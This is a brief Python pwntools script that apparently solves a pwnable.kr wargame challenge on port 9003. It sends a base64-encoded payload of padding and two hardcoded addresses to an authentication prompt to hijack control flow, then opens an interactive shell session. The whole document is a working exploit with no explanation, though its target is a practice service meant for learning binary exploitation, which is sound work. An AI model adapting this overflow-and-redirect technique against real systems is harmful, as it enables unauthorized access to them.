from pwn import *

fd = remote("pwnable.kr", 9003)
pay = ("AAAA" + p32(0x8049273) + p32(0x811eb40)).encode('base64')

fd.recvuntil("Authenticate : ")
fd.send(pay)

fd.interactive()
